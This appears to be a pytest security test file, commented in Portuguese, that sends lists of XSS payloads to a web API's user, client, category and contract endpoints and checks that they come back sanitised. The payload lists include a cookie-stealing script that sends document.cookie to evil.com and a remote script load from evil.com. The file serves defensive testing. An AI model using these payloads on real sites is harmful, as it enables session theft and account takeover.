import pytest
import requests
import time
import html

@pytest.mark.security
@pytest.mark.xss
class TestXSSSecurity:
    """Testes de segurança XSS - Cross-Site Scripting"""

    # Payloads XSS comuns
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<a href=\"javascript:alert('XSS')\">click</a>",
        "javascript:alert('XSS')",
        "<script>document.location='http://evil.com/'+document.cookie</script>",
        "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
        "<div onmouseover=\"alert('XSS')\">hover me</div>",
        "'\"><script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script/src=//evil.com/xss.js>",
        "<img src=1 href=1 onerror=\"javascript:alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<video src=x onerror=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<isindex type=image src=1 onerror=alert('XSS')>",
        "<form><button formaction=\"javascript:alert('XSS')\">",
        "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert('XSS')\">",
        "<table background=\"javascript:alert('XSS')\">",
        "<object data=\"javascript:alert('XSS')\">",
        "<embed src=\"javascript:alert('XSS')\">",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
        "#{alert('XSS')}",
        "<style>@import'javascript:alert(\"XSS\")';</style>",
        "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
        "<div style=\"background:url(javascript:alert('XSS'))\">",
        "<div style=\"width:expression(alert('XSS'))\">",
        "<!--<script>alert('XSS')</script>-->",
        "<![CDATA[<script>alert('XSS')</script>]]>",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
        "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
        "<IMG SRC=`javascript:alert('XSS')`>",
    ]

    # Payloads de DOM-based XSS
    DOM_XSS_PAYLOADS = [
        "#<script>alert('XSS')</script>",
        "?q=<script>alert('XSS')</script>",
        "?search=<img src=x onerror=alert('XSS')>",
        "#javascript:alert('XSS')",
        "?redirect=javascript:alert('XSS')",
        "?url=data:text/html,<script>alert('XSS')</script>",
    ]

    def test_xss_in_username_creation(self, http_client, api_url, root_user, timer):
        """XSS no username ao criar usuário deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        for payload in self.XSS_PAYLOADS[:10]:  # Testar primeiros 10
            response = http_client.post(f"{api_url}/users", json={
                "username": payload,
                "display_name": "XSS Test",
                "password": "ValidPass123!@#a",
                "role": "user"
            }, headers=headers)

            # Deve rejeitar ou sanitizar
            if response.status_code in [200, 201]:
                data = response.json()
                # Verificar que não há script na resposta
                response_text = str(data)
                assert "<script>" not in response_text.lower(), f"XSS payload não sanitizado: {payload}"
                assert "onerror=" not in response_text.lower(), f"XSS payload não sanitizado: {payload}"
                assert "onload=" not in response_text.lower(), f"XSS payload não sanitizado: {payload}"

    def test_xss_in_display_name_creation(self, http_client, api_url, root_user, timer):
        """XSS no display_name ao criar usuário deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        for i, payload in enumerate(self.XSS_PAYLOADS[:5]):
            response = http_client.post(f"{api_url}/users", json={
                "username": f"xsstest_{int(time.time())}_{i}",
                "display_name": payload,
                "password": "ValidPass123!@#a",
                "role": "user"
            }, headers=headers)

            # Deve aceitar mas sanitizar
            if response.status_code in [200, 201]:
                data = response.json()
                response_text = str(data)
                assert "<script>" not in response_text.lower(), f"XSS payload não sanitizado: {payload}"

    def test_xss_in_client_name(self, http_client, api_url, root_user, timer):
        """XSS no nome do cliente deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        for payload in self.XSS_PAYLOADS[:10]:
            response = http_client.post(f"{api_url}/clients", json={
                "name": payload,
                "email": "test@test.com"
            }, headers=headers)

            if response.status_code in [200, 201]:
                data = response.json()
                response_text = str(data)
                assert "<script>" not in response_text.lower(), f"XSS payload não sanitizado no cliente: {payload}"

    def test_xss_in_client_notes(self, http_client, api_url, root_user, timer):
        """XSS nas notas do cliente deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        for i, payload in enumerate(self.XSS_PAYLOADS[:5]):
            response = http_client.post(f"{api_url}/clients", json={
                "name": f"XSS Notes Test {int(time.time())}_{i}",
                "notes": payload,
                "email": "test@test.com"
            }, headers=headers)

            if response.status_code in [200, 201]:
                # Buscar o cliente criado
                client_data = response.json()
                client_id = client_data.get("data", {}).get("id") or client_data.get("id")

                if client_id:
                    get_response = http_client.get(f"{api_url}/clients/{client_id}", headers=headers)
                    if get_response.status_code == 200:
                        client = get_response.json()
                        notes = str(client.get("notes", ""))
                        assert "<script>" not in notes.lower(), f"XSS em notas não sanitizado: {payload}"

    def test_xss_in_category_name(self, http_client, api_url, root_user, timer):
        """XSS no nome da categoria deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        for payload in self.XSS_PAYLOADS[:5]:
            response = http_client.post(f"{api_url}/categories", json={
                "name": payload
            }, headers=headers)

            if response.status_code in [200, 201]:
                data = response.json()
                response_text = str(data)
                assert "<script>" not in response_text.lower(), f"XSS payload não sanitizado: {payload}"

    def test_xss_in_search_params(self, http_client, api_url, root_user, timer):
        """XSS em parâmetros de busca deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        for payload in self.XSS_PAYLOADS[:10]:
            response = http_client.get(
                f"{api_url}/clients",
                params={"search": payload},
                headers=headers
            )

            if response.status_code == 200:
                response_text = response.text
                # Verificar que payload não é refletido sem escape
                assert "<script>" not in response_text, f"XSS refletido no search: {payload}"

    def test_xss_in_error_messages(self, http_client, api_url, timer):
        """Mensagens de erro não devem refletir XSS"""
        for payload in self.XSS_PAYLOADS[:5]:
            response = http_client.post(f"{api_url}/login", json={
                "username": payload,
                "password": "test"
            })

            response_text = response.text
            # Payload não deve ser refletido sem sanitização
            if payload in response_text:
                # Se estiver presente, deve estar escapado
                assert html.escape(payload) in response_text or \
                       payload.replace("<", "&lt;").replace(">", "&gt;") in response_text or \
                       "<script>" not in response_text.lower(), \
                       f"XSS refletido em mensagem de erro: {payload}"

    def test_xss_stored_in_user_list(self, http_client, api_url, root_user, timer):
        """XSS armazenado não deve ser executado ao listar usuários"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        # Criar usuário com payload XSS no display_name
        xss_payload = "<script>alert('stored_xss')</script>"

        create_response = http_client.post(f"{api_url}/users", json={
            "username": f"storedxss_{int(time.time())}",
            "display_name": xss_payload,
            "password": "ValidPass123!@#a",
            "role": "user"
        }, headers=headers)

        # Listar usuários
        list_response = http_client.get(f"{api_url}/users", headers=headers)

        if list_response.status_code == 200:
            response_text = list_response.text
            # O script não deve estar presente sem escape
            assert "<script>alert('stored_xss')</script>" not in response_text, \
                "XSS armazenado não foi sanitizado"

    def test_xss_in_email_field(self, http_client, api_url, root_user, timer):
        """XSS no campo email deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        xss_emails = [
            "<script>alert('xss')</script>@test.com",
            "test@<script>alert('xss')</script>.com",
            "test+<script>alert('xss')</script>@test.com",
            "\"<script>alert('xss')</script>\"@test.com",
        ]

        for email in xss_emails:
            response = http_client.post(f"{api_url}/clients", json={
                "name": f"XSS Email Test {int(time.time())}",
                "email": email
            }, headers=headers)

            # Deve rejeitar email inválido ou sanitizar
            if response.status_code in [200, 201]:
                data = response.json()
                response_text = str(data)
                assert "<script>" not in response_text.lower(), f"XSS em email não sanitizado: {email}"

    def test_xss_in_address_field(self, http_client, api_url, root_user, timer):
        """XSS no campo endereço deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        for payload in self.XSS_PAYLOADS[:5]:
            response = http_client.post(f"{api_url}/clients", json={
                "name": f"XSS Address Test {int(time.time())}",
                "address": payload,
                "email": "test@test.com"
            }, headers=headers)

            if response.status_code in [200, 201]:
                data = response.json()
                response_text = str(data)
                assert "<script>" not in response_text.lower(), f"XSS em endereço não sanitizado: {payload}"

    def test_xss_in_contract_model(self, http_client, api_url, root_user, timer):
        """XSS no campo model do contrato deve ser sanitizado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        # Primeiro criar dependências necessárias (categoria, linha, cliente)
        # Criar categoria
        cat_response = http_client.post(f"{api_url}/categories", json={
            "name": f"XSS Test Category {int(time.time())}"
        }, headers=headers)

        if cat_response.status_code not in [200, 201]:
            pytest.skip("Não foi possível criar categoria de teste")

        cat_data = cat_response.json()
        cat_id = cat_data.get("data", {}).get("id") or cat_data.get("id")

        if not cat_id:
            pytest.skip("ID da categoria não retornado")

        # Criar linha
        line_response = http_client.post(f"{api_url}/lines", json={
            "name": f"XSS Test Line {int(time.time())}",
            "category_id": cat_id
        }, headers=headers)

        if line_response.status_code not in [200, 201]:
            pytest.skip("Não foi possível criar linha de teste")

        line_data = line_response.json()
        line_id = line_data.get("data", {}).get("id") or line_data.get("id")

        if not line_id:
            pytest.skip("ID da linha não retornado")

        # Criar cliente
        client_response = http_client.post(f"{api_url}/clients", json={
            "name": f"XSS Test Client {int(time.time())}",
            "email": "xsstest@test.com"
        }, headers=headers)

        if client_response.status_code not in [200, 201]:
            pytest.skip("Não foi possível criar cliente de teste")

        client_data = client_response.json()
        client_id = client_data.get("data", {}).get("id") or client_data.get("id")

        if not client_id:
            pytest.skip("ID do cliente não retornado")

        # Testar XSS no contrato
        for payload in self.XSS_PAYLOADS[:3]:
            response = http_client.post(f"{api_url}/contracts", json={
                "model": payload,
                "product_key": f"XSS-{int(time.time())}-{hash(payload) % 10000}",
                "line_id": line_id,
                "client_id": client_id
            }, headers=headers)

            if response.status_code in [200, 201]:
                data = response.json()
                response_text = str(data)
                assert "<script>" not in response_text.lower(), f"XSS em model não sanitizado: {payload}"

    def test_content_type_header_json(self, http_client, api_url, root_user, timer):
        """Resposta deve ter Content-Type: application/json"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        response = http_client.get(f"{api_url}/users", headers=headers)

        content_type = response.headers.get("Content-Type", "")
        assert "application/json" in content_type, "Content-Type deve ser application/json"

    def test_no_html_content_type_for_api(self, http_client, api_url, root_user, timer):
        """API não deve retornar text/html que permitiria XSS"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        endpoints = ["/users", "/clients", "/categories", "/contracts"]

        for endpoint in endpoints:
            response = http_client.get(f"{api_url}{endpoint}", headers=headers)
            content_type = response.headers.get("Content-Type", "")

            # Não deve ser text/html
            assert "text/html" not in content_type.lower(), \
                f"Endpoint {endpoint} retornando HTML permite XSS"

    def test_x_content_type_options_header(self, http_client, api_url, timer):
        """Header X-Content-Type-Options deve estar presente para prevenir MIME sniffing"""
        response = http_client.get(f"{api_url}/login")

        # Verificar header de segurança
        x_content_type = response.headers.get("X-Content-Type-Options", "")

        # Este teste documenta se o header está presente
        # É uma boa prática ter X-Content-Type-Options: nosniff
        if x_content_type:
            assert x_content_type.lower() == "nosniff", \
                "X-Content-Type-Options deve ser 'nosniff'"

    def test_xss_via_json_injection(self, http_client, api_url, root_user, timer):
        """Tentativa de injetar XSS via JSON malformado"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {
            "Authorization": f"Bearer {root_user['token']}",
            "Content-Type": "application/json"
        }

        # Tentativas de quebrar JSON e injetar HTML
        malformed_payloads = [
            '{"name": "</script><script>alert(1)</script>"}',
            '{"name": "test", "evil": "<script>alert(1)</script>"}',
            '{"name": "test\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}',
        ]

        for payload in malformed_payloads:
            response = http_client.post(
                f"{api_url}/clients",
                data=payload,
                headers=headers
            )

            if response.status_code in [200, 201]:
                response_text = response.text
                assert "<script>alert(1)</script>" not in response_text, \
                    f"XSS via JSON não sanitizado: {payload}"

    def test_svg_xss_payload(self, http_client, api_url, root_user, timer):
        """SVG XSS payloads devem ser sanitizados"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        svg_payloads = [
            "<svg/onload=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><a xlink:href=\"javascript:alert('XSS')\"><text>click</text></a></svg>",
            "<svg><animate onbegin=alert('XSS')>",
            "<svg><set onbegin=alert('XSS')>",
        ]

        for payload in svg_payloads:
            response = http_client.post(f"{api_url}/clients", json={
                "name": payload,
                "email": "test@test.com"
            }, headers=headers)

            if response.status_code in [200, 201]:
                data = response.json()
                response_text = str(data)
                assert "<svg" not in response_text.lower() or "onload" not in response_text.lower(), \
                    f"SVG XSS não sanitizado: {payload}"

    def test_polyglot_xss_payloads(self, http_client, api_url, root_user, timer):
        """Polyglot XSS payloads devem ser sanitizados"""
        if not root_user or "token" not in root_user:
            pytest.skip("Root user não disponível")

        headers = {"Authorization": f"Bearer {root_user['token']}"}

        polyglot_payloads = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"-->]]>*/</sCrIpT></tItLe></sTyLe></tExTaReA></nOsCrIpT><scrIpt>alert()</scrIpt>",
            "'-alert(1)-'",
            "\\'-alert(1)//",
        ]

        for payload in polyglot_payloads:
            response = http_client.post(f"{api_url}/clients", json={
                "name": f"Polyglot Test {int(time.time())}",
                "notes": payload,
                "email": "test@test.com"
            }, headers=headers)

            # Não deve causar erro e payload deve ser sanitizado
            assert response.status_code in [200, 201, 400], \
                f"Erro inesperado com polyglot payload: {payload}"
